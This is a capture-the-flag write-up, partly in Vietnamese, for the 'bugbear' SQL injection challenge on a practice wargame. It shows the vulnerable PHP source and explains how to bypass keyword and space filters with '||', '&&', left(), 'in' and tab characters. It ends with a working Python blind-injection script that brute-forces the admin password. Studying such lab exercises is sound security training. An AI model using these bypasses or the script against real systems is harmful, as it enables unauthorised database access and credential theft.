bugbear
===
### Description
- Source:
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
  highlight_file(__FILE__); 
?>
```

### Solution
- Phân tích code: Đầu vào của chương trình cho là `pw` và `no`. `pw` bị filter kí tự `'` còn `no` bị filter bởi các kí tự (cụm) `', substr, ascii, =, or, and, %20, like, 0x`. Câu query đầu tiên nếu chúng ta nhập vào pw và no đúng thì sẽ trả về id của guest sau đó in ra `Hello guest`. Câu query thứ hai sẽ trả về id của admin nếu chúng ta nhập vào `pw` đúng với `pw` được trả về trong database và chúng ta có thể giải quyết bài này.
- Không thể kiểm tra length của pw bằng cách của những bài trước vì `like` và `0x` đã bị filter
- Ở bài này chúng ta có thể bypass bằng cách sau: `or` bằng `||`, `and` bằng `&&`, `substr` bằng `mid, left, right,...` ở đây mình sử dụng left, `like` bằng `in` và sử dụng thêm dấu `>` và `<`.

#### Payload
- Code:
```
import requests
import string

url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
header = {'Cookie':'PHPSESSID=vl8pmdg5efq4vgrnf0k309fh3l'}
flag = ''
lists = string.digits+string.ascii_lowercase+string.ascii_uppercase
for i in range(1,256):
	for j in lists:
		temp = flag+j
		param = f'pw=1&no=1||true%26%26id%09in("admin")%26%26left(pw,{i})%09IN%09("{temp}")--%09-'
		print(param)
		r = requests.get(url=url,params=param,headers=header)
		if "Hello admin" in r.text:
			flag += j
			print(flag)
			break
	if len(flag)==8:
		exit(0)
```